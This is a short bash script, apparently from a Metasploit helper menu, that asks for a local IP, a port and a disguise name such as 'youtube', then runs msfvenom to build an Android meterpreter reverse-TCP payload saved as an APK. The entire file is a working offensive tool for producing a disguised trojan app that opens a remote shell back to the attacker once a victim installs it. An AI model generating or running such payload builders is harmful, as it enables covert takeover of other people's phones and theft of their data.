function lhost(){

echo -e $lg " Enter Local Host(your inet IP or public IP "
echo -n -e $ye " [H]: "
read lhost

}
function lport(){

echo -e $lg " Assign Local Port (ex:4444) "
echo -n -e $ye " [P]: "
read lport

}
function pname(){

echo -n -e $lg " [N] Assign a name(ex: youtube ) :> ${ye}"
read name

}


echo " "
lhost
echo " "
lport
echo " "
pname
echo " "
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport --platform android R -o /root/$name.apk
sleep 2
echo -e "\e[92mThe payload is created and stored in the root. \e[0m";
sleep 4
cd $HOME
cd DMSF
bash dmsf.sh


